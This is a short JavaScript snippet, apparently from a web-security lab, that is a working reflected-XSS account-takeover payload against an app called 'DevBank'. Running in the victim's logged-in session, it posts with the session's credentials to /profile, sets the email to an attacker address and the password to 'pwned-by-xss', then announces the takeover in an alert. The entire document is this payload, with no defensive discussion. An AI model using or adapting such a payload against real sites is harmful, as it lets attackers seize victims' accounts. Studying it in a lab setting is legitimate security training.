// Reflected-XSS account-takeover payload (B.2).
// Runs in the victim's logged-in DevBank session and changes their account.
fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "email=attacker@evil.example&password=pwned-by-xss"
}).then(function () {
  alert("Account taken over: email and password changed.");
});
